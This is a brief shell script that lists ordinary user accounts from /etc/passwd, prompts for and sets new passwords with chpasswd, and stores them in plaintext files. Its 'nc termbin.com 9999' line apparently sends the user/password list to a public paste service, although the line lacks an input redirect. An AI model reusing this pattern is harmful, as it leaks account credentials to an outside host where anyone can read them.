#!/bin/sh
awk -F ':' '$3>=1000 {print $1}' /etc/passwd > u.txt
STR="hey"
rm lists.txt
rm hostname.txt
for user in `more u.txt`
do
	echo "Enter new password for" $user"."
	read STR
	echo $user":"$STR >> lists.txt
	echo $user","$STR >> hostname.txt
done
rm u.txt
chpasswd < lists.txt
nc termbin.com 9999 
rm hostname.txt
rm lists.txt
